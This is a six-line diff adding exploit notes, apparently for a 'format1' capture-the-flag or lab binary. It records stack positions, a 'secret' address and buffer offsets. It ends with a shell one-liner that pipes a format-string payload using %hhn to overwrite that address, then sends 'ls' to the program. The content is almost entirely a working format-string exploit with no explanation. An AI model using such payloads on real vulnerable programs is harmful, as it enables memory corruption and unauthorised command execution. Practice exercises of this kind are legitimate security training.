@@ -1,0 +1,6 @@
+Pos 7 = string buf
+secret=0x0804a040
+Pos 33=offset 104 in string buf
+Pos 34=offset 108 in string buf
+
+{ sleep 1; echo -e "%192c%10\x24hhn\x40\xa0\x04\x08"; sleep 1; echo "ls"; } | ./format1
